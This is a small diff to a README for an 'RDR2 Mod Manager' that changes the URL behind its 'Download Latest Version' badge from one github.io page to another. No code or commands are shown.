@@ -10,7 +10,7 @@
 
 | 🚀 Download RDR2 Mod Manager |
 |---|
-| [![Download RDR2 Mod Manager](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://RDR2-Mod-Manager.github.io/.github/) |
+| [![Download RDR2 Mod Manager](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://alarmmi.github.io/RDR2-Mod-Manager/) |
 
 </div>
 
